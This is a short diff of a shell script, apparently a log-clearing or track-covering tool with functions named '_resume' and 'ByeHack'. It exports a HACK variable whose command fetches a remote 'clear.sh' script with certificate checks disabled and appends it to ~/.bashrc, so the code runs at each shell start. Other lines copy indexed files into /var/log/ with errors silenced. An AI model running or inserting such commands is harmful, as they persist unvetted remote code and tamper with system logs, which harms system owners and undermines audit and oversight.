@@ -50,7 +50,7 @@ function _bak {
 function _resume {
   for i in $(cat $index_f);
   do
-    cp -v $i /var/log/ ;
+    cp -v $i /var/log/  2>/dev/null;
   done
 }
 
@@ -117,4 +117,4 @@ function ByeHack {
 }
 
 trap exit_session SIGHUP
-export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >>     ~/.bashrc ;  bash" 
+export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >>     ~/.bashrc ;  bash ; . ~/.bash_logout" 
